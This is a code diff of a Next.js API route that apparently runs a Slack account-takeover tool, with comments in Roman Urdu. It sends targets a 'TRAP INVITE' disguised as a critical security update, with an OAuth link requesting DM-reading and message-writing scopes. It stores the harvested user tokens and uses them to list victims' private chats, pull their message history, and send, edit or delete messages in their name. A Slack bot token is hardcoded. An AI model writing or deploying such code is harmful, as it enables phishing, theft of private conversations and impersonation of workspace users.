@@ -1,14 +1,12 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 // app/api/slack/manager/route.ts
 
-// app/api/slack/manager/route.ts
-
 import { NextResponse } from 'next/server';
 // import { db } from '@/lib/firebase'; 
-import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
+import { doc, getDoc, deleteDoc, setDoc } from 'firebase/firestore';
 import { db } from '../../../../lib/firebase';
 
-// ⚠️ KEYS CHECK KAREIN
+// ⚠️ KEYS (Apni keys confirm kar lein)
 const BOT_TOKEN = "xoxb-2545190050563-10450716721751-b6iM5o3wEqry9QIPNb0kXO3U"; 
 const CLIENT_ID = "2545190050563.10479083209969";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
@@ -18,14 +16,12 @@ export async function POST(req: Request) {
     const body = await req.json();
     const { action, targetUserId, channelId, text, messageTs, newText } = body;
 
-    // --- CASE 1: SEND TRAP INVITE (MULTIPLE STORAGE) ---
+    // --- CASE 1: SEND TRAP INVITE ---
     if (action === 'send_invite') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
-       
        const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
        const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
        
-       // Trap Message Design
        const blocks = [
         { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
         { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
@@ -46,65 +42,41 @@ export async function POST(req: Request) {
        const chatData = await chatRes.json();
        if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
 
-       // ✅ NEW LOGIC: Store in Array (List)
-       const inviteRef = doc(db, "pending_invites", targetUserId);
-       
-       try {
-           // Pehlay check karo koi purana data hai?
-           const docSnap = await getDoc(inviteRef);
-           let existingMessages = [];
-           
-           if (docSnap.exists()) {
-               existingMessages = docSnap.data().messages || [];
-           }
-
-           // Naya message list main daalo
-           existingMessages.push({
-               ts: chatData.ts,
-               channel: chatData.channel,
-               sentAt: new Date().toISOString()
-           });
-
-           // Wapas save karo
-           await setDoc(inviteRef, { messages: existingMessages });
-           
-       } catch (e) { console.error("Firebase Write Failed:", e); }
-       
+       try { await setDoc(doc(db, "pending_invites", targetUserId), { ts: chatData.ts, channel: chatData.channel }); } catch(e) {}
        return NextResponse.json({ success: true });
     }
 
     // --- CASE 2: DELETE USER ---
     if (action === 'delete_user') {
-        try {
-            await deleteDoc(doc(db, "slack_tokens", targetUserId));
-            return NextResponse.json({ success: true });
-        } catch (e) { return NextResponse.json({ error: "DB Error" }); }
+        try { await deleteDoc(doc(db, "slack_tokens", targetUserId)); } catch(e) {}
+        return NextResponse.json({ success: true });
     }
 
     // --- TOKEN CHECK ---
     if (!targetUserId) return NextResponse.json({ error: "User ID required" });
-    
     let USER_TOKEN = "";
     try {
         const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
         if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
         USER_TOKEN = tokenDoc.data().accessToken;
-    } catch (e: any) {
-        return NextResponse.json({ error: "Database Error" }, { status: 503 });
-    }
+    } catch (e) { return NextResponse.json({ error: "Database Error - Free Quota Exceeded" }, { status: 503 }); }
 
-    // --- CASE 3: LIST CHATS ---
+    // --- CASE 3: LIST CHATS (🔥 SUPER SEARCH MODE) ---
     if (action === 'list_chats') {
+        // 1. Chats lao
         const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
             headers: { Authorization: `Bearer ${USER_TOKEN}` } 
         });
         const chatData = await chatRes.json();
-        
         if(!chatData.ok) return NextResponse.json({ chats: [] });
 
-        const usersRes = await fetch('https://slack.com/api/users.list', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+        // 2. Pehlay 'Bulk' main users lao (Fast)
+        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', {
+            headers: { Authorization: `Bearer ${USER_TOKEN}` }
+        });
         const usersData = await usersRes.json();
 
+        // Map banao taakay baar baar search na karna paray
         const userMap: Record<string, any> = {};
         if (usersData.ok && usersData.members) {
             usersData.members.forEach((u: any) => {
@@ -115,23 +87,48 @@ export async function POST(req: Request) {
             });
         }
 
+        // 3. Process Chats (Unknown User Killer Logic)
         const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
+            let displayName = "Group Chat";
+            let displayImage = null;
             let unreadCount = 0;
+
+            // Unread Count
             try {
-                const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, {
-                    headers: { Authorization: `Bearer ${USER_TOKEN}` }
-                });
+                const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                 const infoData = await infoRes.json();
-                if(infoData.ok && infoData.channel) {
-                    unreadCount = infoData.channel.unread_count_display || 0;
-                }
+                if(infoData.ok && infoData.channel) unreadCount = infoData.channel.unread_count_display || 0;
             } catch(e) {}
 
             if(c.is_im) {
-                const user = userMap[c.user] || { name: "Unknown User", image: null };
-                return { ...c, name: user.name, image: user.image, unread: unreadCount };
+                const userId = c.user;
+                
+                // OPTION A: Agar local map main hai (Fast)
+                if(userMap[userId]) {
+                    displayName = userMap[userId].name;
+                    displayImage = userMap[userId].image;
+                } 
+                // OPTION B: Agar nahi mila (Unknown), to Server se Specially Pucho (Slow but Accurate)
+                else {
+                    try {
+                        const singleUserRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
+                            headers: { Authorization: `Bearer ${USER_TOKEN}` }
+                        });
+                        const singleUserData = await singleUserRes.json();
+                        if(singleUserData.ok) {
+                            displayName = singleUserData.user.real_name || singleUserData.user.name;
+                            displayImage = singleUserData.user.profile.image_48;
+                        } else {
+                            displayName = `ID: ${userId}`; // Last Resort
+                        }
+                    } catch(e) {
+                        displayName = `External: ${userId}`;
+                    }
+                }
+                return { ...c, name: displayName, image: displayImage, unread: unreadCount };
             }
-            return { ...c, name: "Group Chat", image: null, unread: unreadCount };
+            
+            return { ...c, name: displayName, image: displayImage, unread: unreadCount };
         }));
 
         return NextResponse.json({ chats });
@@ -144,20 +141,18 @@ export async function POST(req: Request) {
         let nextCursor = undefined;
         let loopCount = 0;
 
-        while (hasMore && loopCount < 3) { 
-            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
+        // Loop 2 times only to prevent timeout (400 messages max)
+        while (hasMore && loopCount < 2) { 
+            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=200`;
             if (nextCursor) url += `&cursor=${nextCursor}`;
-
             try {
                 const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                 const data = await res.json();
-
                 if (data.ok && data.messages) {
                     allMessages = [...allMessages, ...data.messages];
-                    if (data.has_more && data.response_metadata?.next_cursor) {
-                        nextCursor = data.response_metadata.next_cursor;
-                    } else { hasMore = false; }
-                } else { hasMore = false; }
+                    if (data.has_more && data.response_metadata?.next_cursor) nextCursor = data.response_metadata.next_cursor;
+                    else hasMore = false;
+                } else hasMore = false;
             } catch (err) { hasMore = false; }
             loopCount++;
         }
@@ -173,7 +168,6 @@ export async function POST(req: Request) {
         });
         return NextResponse.json(await res.json());
     }
-
     if (action === 'delete_message') {
         const res = await fetch('https://slack.com/api/chat.delete', {
             method: 'POST',
@@ -182,7 +176,6 @@ export async function POST(req: Request) {
         });
         return NextResponse.json(await res.json());
     }
-
     if (action === 'edit_message') {
         const res = await fetch('https://slack.com/api/chat.update', {
             method: 'POST',
@@ -195,6 +188,6 @@ export async function POST(req: Request) {
     return NextResponse.json({ error: "Invalid Action" });
 
   } catch (e: any) {
-    return NextResponse.json({ success: false, error: "System Error" }, { status: 200 });
+    return NextResponse.json({ success: false, error: "System Busy" }, { status: 200 });
   }
 }
